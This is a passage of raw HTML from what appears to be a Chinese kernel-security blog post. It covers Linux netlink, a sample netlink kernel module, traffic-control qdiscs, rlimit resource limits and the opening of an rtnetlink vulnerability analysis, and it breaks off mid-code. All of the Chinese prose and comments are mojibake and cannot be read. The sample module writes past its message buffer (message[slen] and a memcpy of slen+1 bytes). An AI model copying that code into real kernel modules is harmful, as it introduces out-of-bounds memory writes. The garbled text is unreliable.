class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/skbuff.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink.h&gt;</span> <span class="comment">/*è¯¥æ–‡å¤´æ–‡ä»¶é‡ŒåŒ…å«äº†linux/netlink.hï¼Œå› ä¸ºæˆ‘ä»¬è¦ç”¨åˆ°net/netlink.hä¸­çš„æŸäº›APIå‡½æ•°ï¼Œnlmsg_put()*/</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Koorey King&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nl_sk</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//å‘ç”¨æˆ·ç©ºé—´å‘é€æ¶ˆæ¯çš„æ¥å£</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendnlmsg</span><span class="params">(<span class="keyword">char</span> *message,<span class="keyword">int</span> dstPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> len = NLMSG_SPACE(MAX_MSGSIZE);</span><br><span class="line">    <span class="keyword">int</span> slen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!message || !nl_sk)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ºæ–°çš„ sk_bufferç”³è¯·ç©ºé—´</span></span><br><span class="line">    skb = alloc_skb(len, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(!skb)&#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;my_net_link: alloc_skb Error./n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    slen = <span class="built_in">strlen</span>(message)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç”¨nlmsg_put()æ¥è®¾ç½®netlinkæ¶ˆæ¯å¤´éƒ¨</span></span><br><span class="line">    nlh = nlmsg_put(skb, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, MAX_MSGSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®Netlinkçš„æ§åˆ¶å—</span></span><br><span class="line">    NETLINK_CB(skb).pid = <span class="number">0</span>; <span class="comment">// æ¶ˆæ¯å‘é€è€…çš„idæ ‡è¯†ï¼Œå¦‚æœæ˜¯å†…æ ¸å‘çš„åˆ™ç½®0</span></span><br><span class="line">    NETLINK_CB(skb).dst_group = <span class="number">0</span>; <span class="comment">//å¦‚æœç›®çš„ç»„ä¸ºå†…æ ¸æˆ–æŸä¸€è¿›ç¨‹ï¼Œè¯¥å­—æ®µä¹Ÿç½®0</span></span><br><span class="line"></span><br><span class="line">    message[slen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(NLMSG_DATA(nlh), message, slen+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é€šè¿‡netlink_unicast()å°†æ¶ˆæ¯å‘é€ç”¨æˆ·ç©ºé—´ç”±dstPIDæ‰€æŒ‡å®šäº†è¿›ç¨‹å·çš„è¿›ç¨‹</span></span><br><span class="line">    netlink_unicast(nl_sk,skb,dstPID,<span class="number">0</span>);</span><br><span class="line">    printk(<span class="string">&quot;send OK!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nl_data_ready</span> <span class="params">(struct sock *sk, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((skb = skb_dequeue(&amp;sk-&gt;sk_receive_queue)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nlh = (struct nlmsghdr *)skb-&gt;data;</span><br><span class="line">        printk(<span class="string">&quot;%s: received netlink message payload: %s \n&quot;</span>, __FUNCTION__, (<span class="keyword">char</span>*)NLMSG_DATA(nlh));</span><br><span class="line">        sendnlmsg(<span class="string">&quot;I see you&quot;</span>,nlh-&gt;nlmsg_pid); <span class="comment">//å‘é€è€…çš„è¿›ç¨‹IDæˆ‘ä»¬å·²ç»å°†å…¶å­˜å‚¨åœ¨äº†netlinkæ¶ˆæ¯å¤´éƒ¨é‡Œçš„nlmsg_pidå­—æ®µé‡Œï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æ‹¿æ¥ç”¨ã€‚</span></span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;recvied finished!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">myinit_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;my netlink in\n&quot;</span>);</span><br><span class="line">    nl_sk = netlink_kernel_create(NETLINK_TEST,<span class="number">0</span>,nl_data_ready,THIS_MODULE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">mycleanup_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;my netlink out!\n&quot;</span>);</span><br><span class="line">    sock_release(nl_sk-&gt;sk_socket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(myinit_module);</span><br><span class="line">module_exit(mycleanup_module);</span><br></pre></td></tr></table></figure>

<h3 id="linuxæµé‡æ§åˆ¶"><a href="#linuxæµé‡æ§åˆ¶" class="headerlink" title="linuxæµé‡æ§åˆ¶"></a>linuxæµé‡æ§åˆ¶</h3><h4 id="æ¦‚å¿µç†è§£"><a href="#æ¦‚å¿µç†è§£" class="headerlink" title="æ¦‚å¿µç†è§£"></a>æ¦‚å¿µç†è§£</h4><p>åœ¨æ¦‚å¿µä¸Šæœ‰äº†ä¸€ä¸ªå¤§è‡´äº†è§£ï¼Œä½†ä¸å¤šï¼Œåœ¨Linuxä¸­è¦å®ç°å¯¹æ•°æ®åŒ…æ¥æ”¶å’Œå‘é€çš„è¿™äº›æ§åˆ¶è¡Œä¸ºï¼Œéœ€è¦ä½¿ç”¨é˜Ÿåˆ—ç»“æ„æ¥ä¸´æ—¶ä¿å­˜æ•°æ®åŒ…ã€‚åœ¨Linuxå®ç°ä¸­ï¼ŒæŠŠè¿™ç§åŒ…æ‹¬æ•°æ®ç»“æ„å’Œç®—æ³•å®ç°çš„æ§åˆ¶æœºåˆ¶æŠ½è±¡ä¸ºç»“æ„<code>é˜Ÿåˆ—è§„ç¨‹:Queuing discipline</code>ï¼Œç®€ç§°ä¸º<code>qdisc</code>ã€‚<code>qdisc</code>å¯¹å¤–æš´éœ²ä¸¤ä¸ªå›è°ƒæ¥å£<code>enqueue</code>å’Œ<code>dequeue</code>åˆ†åˆ«ç”¨äºæ•°æ®åŒ…å…¥é˜Ÿå’Œæ•°æ®åŒ…å‡ºé˜Ÿï¼Œè€Œå…·ä½“çš„æ’é˜Ÿç®—æ³•å®ç°åˆ™åœ¨<code>qdisc</code>å†…éƒ¨éšè—ã€‚ä¸åŒçš„<code>qdisc</code>å®ç°åœ¨Linuxå†…æ ¸ä¸­å®ç°ä¸ºä¸åŒçš„å†…æ ¸æ¨¡å—ã€‚</p>
<p><code>qdisc</code>çš„å®ç°å¯ä»¥éå¸¸ç®€å•ï¼Œæ¯”å¦‚åªåŒ…å«å•ä¸ªé˜Ÿåˆ—ï¼Œæ•°æ®åŒ…å…ˆè¿›å…ˆå‡ºï¼Œå¦‚: <code>pfifo</code>, ä»£ç ä½äº<code>net/sched/sch_fifo.c</code>ã€‚ä¹Ÿå¯ä»¥å®ç°ç›¸å½“å¤æ‚çš„è°ƒåº¦é€»è¾‘ã€‚æ¯”å¦‚ï¼Œå¯ä»¥æ ¹æ®æ•°æ®åŒ…çš„å±æ€§è¿›è¡Œè¿‡æ»¤åˆ†ç±»ï¼Œè€Œé’ˆå¯¹ä¸åŒçš„<code>åˆ†ç±»:class</code>é‡‡ç”¨ä¸åŒçš„ç®—æ³•æ¥è¿›è¡Œå¤„ç†ã€‚<code>class</code>å¯ä»¥ç†è§£ä¸º<code>qdisc</code>çš„è½½ä½“ï¼Œå®ƒè¿˜å¯ä»¥åŒ…å«å­ç±»ä¸<code>qdisc</code>ã€‚ç”¨æ¥å®ç°è¿‡æ»¤é€»è¾‘çš„ç»„ä»¶å«åš<code>filter</code>ï¼Œä¹Ÿå«åš<code>åˆ†ç±»å™¨classfier</code>, å®ƒéœ€è¦æŒ‚è½½åœ¨<code>qdisc</code>æˆ–è€…<code>class</code>ä¸Šã€‚</p>
<p>åŸºäº<code>qdisc</code>, <code>class</code>å’Œ<code>filter</code>ç§ä¸‰å…ƒç´ å¯ä»¥æ„å»ºå‡ºéå¸¸å¤æ‚çš„æ ‘å½¢<code>qdisc</code>ç»“æ„ï¼Œæå¤§æ‰©å±•æµé‡æ§åˆ¶çš„èƒ½åŠ›ã€‚</p>
<p>å¯¹äºæ ‘å½¢ç»“æ„çš„<code>qdisc</code>, å½“æ•°æ®åŒ…æµç¨‹æœ€é¡¶å±‚<code>qdisc</code>æ—¶ï¼Œä¼šå±‚å±‚å‘ä¸‹é€’å½’è¿›è¡Œè°ƒç”¨ã€‚å¦‚ï¼Œçˆ¶å¯¹è±¡(<code>qdisc/class</code>)çš„<code>enqueue</code>å›è°ƒæ¥å£è¢«è°ƒç”¨æ—¶ï¼Œå…¶ä¸Šæ‰€æŒ‚è½½çš„æ‰€æœ‰<code>filter</code>ä¾æ¬¡è¢«è°ƒç”¨ï¼Œç›´åˆ°ä¸€ä¸ª<code>filter</code>åŒ¹é…æˆåŠŸã€‚ç„¶åå°†æ•°æ®åŒ…å…¥é˜Ÿåˆ°<code>filter</code>æ‰€æŒ‡å‘çš„<code>class</code>ï¼Œå…·ä½“å®ç°åˆ™æ˜¯è°ƒç”¨<code>class</code>æ‰€é…ç½®çš„<code>Qdisc</code>çš„<code>enqueue</code>å‡½æ•°ã€‚æ²¡æœ‰æˆåŠŸåŒ¹é…<code>filter</code>çš„æ•°æ®åŒ…åˆ†ç±»åˆ°é»˜è®¤çš„<code>class</code>ä¸­ã€‚</p>
<p><img src="http://just4coding.com/images/2022-08-05/1.png" alt="img"></p>
<h4 id="ç›¸å…³æ•°æ®ç»“æ„"><a href="#ç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="ç›¸å…³æ•°æ®ç»“æ„"></a>ç›¸å…³æ•°æ®ç»“æ„</h4><p>è¯¦æƒ…æŸ¥çœ‹<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoyu_750516366/article/details/121177872">https://blog.csdn.net/xiaoyu_750516366/article/details/121177872</a></p>
<h4 id="ç³»ç»Ÿèµ„æºæ§åˆ¶"><a href="#ç³»ç»Ÿèµ„æºæ§åˆ¶" class="headerlink" title="ç³»ç»Ÿèµ„æºæ§åˆ¶"></a>ç³»ç»Ÿèµ„æºæ§åˆ¶</h4><p>æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ä¸€ç»„èµ„æºé™åˆ¶ï¼Œåœ¨(*)inuxç³»ç»Ÿä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrlimit</span><span class="params">(<span class="keyword">int</span> resource, struct rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setrlimit</span><span class="params">(<span class="keyword">int</span> resource, <span class="keyword">const</span> struct rlimit *rlim)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>resource</strong>ï¼šå¯èƒ½çš„é€‰æ‹©æœ‰</p>
<p><strong>RLIMIT_AS</strong> //è¿›ç¨‹çš„æœ€å¤§è™šå†…å­˜ç©ºé—´ï¼Œå­—èŠ‚ä¸ºå•ä½ã€‚<br><strong>RLIMIT_CORE</strong> //å†…æ ¸è½¬å­˜æ–‡ä»¶çš„æœ€å¤§é•¿åº¦ã€‚<br><strong>RLIMIT_CPU</strong> //æœ€å¤§å…è®¸çš„CPUä½¿ç”¨æ—¶é—´ï¼Œç§’ä¸ºå•ä½ã€‚å½“è¿›ç¨‹è¾¾åˆ°è½¯é™åˆ¶ï¼Œå†…æ ¸å°†ç»™å…¶å‘é€SIGXCPUä¿¡å·ï¼Œè¿™ä¸€ä¿¡å·çš„é»˜è®¤è¡Œä¸ºæ˜¯ç»ˆæ­¢è¿›ç¨‹çš„æ‰§è¡Œã€‚ç„¶è€Œï¼Œå¯ä»¥æ•æ‰ä¿¡å·ï¼Œå¤„ç†å¥æŸ„å¯å°†æ§åˆ¶è¿”å›ç»™ä¸»ç¨‹åºã€‚å¦‚æœè¿›ç¨‹ç»§ç»­è€—è´¹CPUæ—¶é—´ï¼Œæ ¸å¿ƒä¼šä»¥æ¯ç§’ä¸€æ¬¡çš„é¢‘ç‡ç»™å…¶å‘é€SIGXCPUä¿¡å·ï¼Œç›´åˆ°è¾¾åˆ°ç¡¬é™åˆ¶ï¼Œé‚£æ—¶å°†ç»™è¿›ç¨‹å‘é€ SIGKILLä¿¡å·ç»ˆæ­¢å…¶æ‰§è¡Œã€‚<br><strong>RLIMIT_DATA</strong> //è¿›ç¨‹æ•°æ®æ®µçš„æœ€å¤§å€¼ã€‚<br><strong>RLIMIT_FSIZE</strong> //è¿›ç¨‹å¯å»ºç«‹çš„æ–‡ä»¶çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœè¿›ç¨‹è¯•å›¾è¶…å‡ºè¿™ä¸€é™åˆ¶æ—¶ï¼Œæ ¸å¿ƒä¼šç»™å…¶å‘é€SIGXFSZä¿¡å·ï¼Œé»˜è®¤æƒ…å†µä¸‹å°†ç»ˆæ­¢è¿›ç¨‹çš„æ‰§è¡Œã€‚<br><strong>RLIMIT_LOCKS</strong> //è¿›ç¨‹å¯å»ºç«‹çš„é”å’Œç§Ÿèµçš„æœ€å¤§å€¼ã€‚<br><strong>RLIMIT_MEMLOCK</strong> //è¿›ç¨‹å¯é”å®šåœ¨å†…å­˜ä¸­çš„æœ€å¤§æ•°æ®é‡ï¼Œå­—èŠ‚ä¸ºå•ä½ã€‚<br><strong>RLIMIT_MSGQUEUE</strong> //è¿›ç¨‹å¯ä¸ºPOSIXæ¶ˆæ¯é˜Ÿåˆ—åˆ†é…çš„æœ€å¤§å­—èŠ‚æ•°ã€‚<br><strong>RLIMIT_NICE</strong> //è¿›ç¨‹å¯é€šè¿‡setpriority() æˆ– nice()è°ƒç”¨è®¾ç½®çš„æœ€å¤§å®Œç¾å€¼ã€‚<br><strong>RLIMIT_NOFILE</strong> //æŒ‡å®šæ¯”è¿›ç¨‹å¯æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æè¿°è¯å¤§ä¸€çš„å€¼ï¼Œè¶…å‡ºæ­¤å€¼ï¼Œå°†ä¼šäº§ç”ŸEMFILEé”™è¯¯ã€‚<br><strong>RLIMIT_NPROC</strong> //ç”¨æˆ·å¯æ‹¥æœ‰çš„æœ€å¤§è¿›ç¨‹æ•°ã€‚<br><strong>RLIMIT_RTPRIO</strong> //è¿›ç¨‹å¯é€šè¿‡sched_setscheduler å’Œ sched_setparamè®¾ç½®çš„æœ€å¤§å®æ—¶ä¼˜å…ˆçº§ã€‚<br><strong>RLIMIT_SIGPENDING</strong> //ç”¨æˆ·å¯æ‹¥æœ‰çš„æœ€å¤§æŒ‚èµ·ä¿¡å·æ•°ã€‚<br><strong>RLIMIT_STACK</strong> //æœ€å¤§çš„è¿›ç¨‹å †æ ˆï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</p>
<p>è¿™2ä¸ªAPIæ¥å–å¾—å’Œè®¾ç½®èµ„æº<br>getrlimitç”¨æ¥å–å¾—setrlimitç”¨æ¥è®¾ç½® è¿™äºŒä¸ªå‚æ•°éƒ½éœ€è¦ä¸€ä¸ªè¦æ§åˆ¶çš„èµ„æº æ¯”å¦‚æ§åˆ¶CPUã€å†…å­˜ã€æ–‡ä»¶æè¿°ç¬¦ä¸ªæ•°ç­‰ç­‰çš„æ§åˆ¶ï¼Œä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªrlimitçš„ç»“æ„ä½“åœ°å€ï¼ˆæŒ‡é’ˆï¼‰ï¼Œä»–çš„ç»“æ„å¦‚ä¸‹å®šä¹‰ï¼š<br>å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶/usr/include/bits/resource.hä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">     <span class="comment">/* The current (soft) limit.    */</span></span><br><span class="line">     <span class="keyword">rlim_t</span> rlim_cur;</span><br><span class="line">     <span class="comment">/* The hard limit.    */</span></span><br><span class="line">     <span class="keyword">rlim_t</span> rlim_max;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>ç»“æ„ä½“ä¸­ rlim_curæ˜¯è¦å–å¾—æˆ–è®¾ç½®çš„èµ„æºè½¯é™åˆ¶çš„å€¼ï¼Œrlim_maxæ˜¯ç¡¬é™åˆ¶<br>è¿™ä¸¤ä¸ªå€¼çš„è®¾ç½®æœ‰ä¸€ä¸ªå°çš„çº¦æŸï¼š<br>1ï¼‰ ä»»ä½•è¿›ç¨‹å¯ä»¥å°†è½¯é™åˆ¶æ”¹ä¸ºå°äºæˆ–ç­‰äºç¡¬é™åˆ¶<br>2ï¼‰ ä»»ä½•è¿›ç¨‹éƒ½å¯ä»¥å°†ç¡¬é™åˆ¶é™ä½ï¼Œä½†æ™®é€šç”¨æˆ·é™ä½äº†å°±æ— æ³•æé«˜ï¼Œè¯¥å€¼å¿…é¡»ç­‰äºæˆ–å¤§äºè½¯é™åˆ¶<br>3ï¼‰ åªæœ‰è¶…çº§ç”¨æˆ·å¯ä»¥æé«˜ç¡¬é™åˆ¶<br>ä¸€ä¸ªæ— é™çš„é™åˆ¶ç”±å¸¸é‡RLIM_INFINITYæŒ‡å®šï¼ˆThe value RLIM_INFINITY denotes no limit on a resource ï¼‰</p>
<h2 id="æ¼æ´æ¨¡å—rtnetlinkåˆ†æ"><a href="#æ¼æ´æ¨¡å—rtnetlinkåˆ†æ" class="headerlink" title="æ¼æ´æ¨¡å—rtnetlinkåˆ†æ"></a>æ¼æ´æ¨¡å—rtnetlinkåˆ†æ</h2><p>netlinkæœºåˆ¶æœ‰å¾ˆå¤šåè®®ï¼Œæ¯ä¸ªåè®®å¤„ç†ä¸åŒçš„äº‹æƒ…ï¼Œrtnetlinkå°±æ˜¯netlinkçš„å…¶ä¸­ä¸€ä¸ªåè®®ï¼Œä¸‹é¢å°±æ˜¯netlinkåè®®çš„ä¸€äº›å®å®šä¹‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ROUTE        0    <span class="comment">/* Routing/device hook                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_UNUSED        1    <span class="comment">/* Unused number                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_USERSOCK    2    <span class="comment">/* Reserved for user mode socket protocols     */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_FIREWALL    3    <span class="comment">/* Firewalling hook                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_INET_DIAG    4    <span class="comment">/* INET socket monitoring            */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_NFLOG        5    <span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_XFRM        6    <span class="comment">/* ipsec */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_SELINUX        7    <span class="comment">/* SELinux event notifications */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ISCSI        8    <span class="comment">/* Open-iSCSI */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_AUDIT        9    <span class="comment">/* auditing */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_FIB_LOOKUP    10    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_CONNECTOR    11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_NETFILTER    12    <span class="comment">/* netfilter subsystem */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_IP6_FW        13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_DNRTMSG        14    <span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_KOBJECT_UEVENT    15    <span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_GENERIC        16</span></span><br><span class="line"><span class="comment">/* leave room for NETLINK_DM (DM Events) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_SCSITRANSPORT    18    <span class="comment">/* SCSI Transports */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ECRYPTFS    19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_TEST    20 <span class="comment">/* ç”¨æˆ·æ·»åŠ çš„è‡ªå®šä¹‰åè®® */</span></span></span><br></pre></td></tr></table></figure>

<p>æ¯ç§åè®®å¤„ç†ä¸åŒçš„äº‹æƒ…ï¼Œé‚£rtnetlinkæ˜¯å¹²ä»€ä¹ˆçš„å‘¢ï¼Œåœ¨æˆ‘çš„åˆæ­¥äº†è§£ä¸­ï¼Œrtnetlinkä¸»è¦å¯ä»¥æ›´æ”¹å’Œè·å–å†…æ ¸çš„ä¸€äº›ç½‘ç»œé…ç½®ï¼Œæ¯”å¦‚è¯´ç½‘ç»œè·¯ç”±ã€IPåœ°å€ã€é“¾æ¥å‚æ•°ã€é‚»å±…è®¾ç½®ã€æ’é˜Ÿè§„åˆ™ã€æµé‡ç±»åˆ«å’Œæ•°æ®åŒ…åˆ†ç±»å™¨éƒ½å¯ä»¥é€šNETLINK_ROUTEå¥—æ¥å­—è¿›è¡Œæ§åˆ¶ã€‚</p>
<p>rtnetlinkä¸»è¦ç”±ä»¥ä¸‹æ¶ˆæ¯ç±»å‹ç»„æˆ</p>
<ul>
<li>RTM_NEWLINKã€RTM_DELLINKã€RTM_GETLINKåˆ›å»ºã€åˆ é™¤æˆ–è·å–æœ‰å…³ç‰¹å®šç½‘ç»œæ¥å£çš„ä¿¡æ¯ã€‚</li>
<li>RTM_NEWADDRã€RTM_DELADDRã€RTM_GETADDRæ·»åŠ ã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³ä¸æ¥å£å…³è”çš„IPåœ°å€çš„ä¿¡æ¯ã€‚</li>
<li>RTM_NEWROUTEã€RTM_DELROUTEã€RTM_GETROUTEåˆ›å»ºã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³ç½‘ç»œè·¯ç”±çš„ä¿¡æ¯ã€‚</li>
<li>RTM_NEWNEIGHã€RTM_DELNEIGHã€RTM_GETNEIGHæ·»åŠ ã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³é‚»å±…è¡¨æ¡ç›®çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼ŒARPæ¡ç›®ï¼‰ã€‚</li>
<li>RTM_NEWRULEã€RTM_DELRULEã€RTM_GETRULEæ·»åŠ ã€åˆ é™¤æˆ–æ£€ç´¢è·¯ç”±è§„åˆ™ã€‚</li>
<li>RTM_NEWQDISCã€RTM_DELQDISCã€RTM_GETQDISCæ·»åŠ ã€åˆ é™¤æˆ–è·å–æ’é˜Ÿè§„åˆ™ã€‚</li>
<li>RTM_NEWTCLASSã€RTM_DELTCLASSã€RTM_GETTCLASSæ·»åŠ ã€åˆ é™¤æˆ–è·å–æµé‡ç±»åˆ«ã€‚</li>
<li>RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTERæ·»åŠ ã€åˆ é™¤æˆ–æ¥æ”¶æœ‰å…³æµé‡è¿‡æ»¤å™¨çš„ä¿¡æ¯ã€‚</li>
</ul>
<h4 id="rtnetlinkç›¸å…³ä»£ç åˆ†æ"><a href="#rtnetlinkç›¸å…³ä»£ç åˆ†æ" class="headerlink" title="rtnetlinkç›¸å…³ä»£ç åˆ†æ"></a>rtnetlinkç›¸å…³ä»£ç åˆ†æ</h4><p>ä½¿ç”¨<code>NETLINK_ROUTE</code>å°±å¯ä»¥å’Œrtnetlinkè¿›è¡Œé€šä¿¡äº†ï¼Œrtnetlinkæœ‰ä¸åŒçš„æ¶ˆæ¯ç±»å‹ï¼Œä¸åŒçš„æ¶ˆæ¯ç±»å‹ä¹Ÿæœ‰ä¸åŒçš„type,æ‰€ä»¥rtnetlinkè¿›è¡Œåˆå§‹åŒ–çš„æ—¶å€™å°±ä¼šé’ˆå¯¹ä¸åŒæƒ…å†µæ³¨å†Œä¸åŒçš„æ“ä½œå‡½æ•°ã€‚  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">rtnetlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (register_pernet_subsys(&amp;rtnetlink_net_ops))</span><br><span class="line">		panic(<span class="string">&quot;rtnetlink_init: cannot initialize rtnetlink\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	register_netdevice_notifier(&amp;rtnetlink_dev_notifier);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETLINK, rtnl_getlink,</span><br><span class="line">		      rtnl_dump_ifinfo, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, <span class="literal">NULL</span>, <span 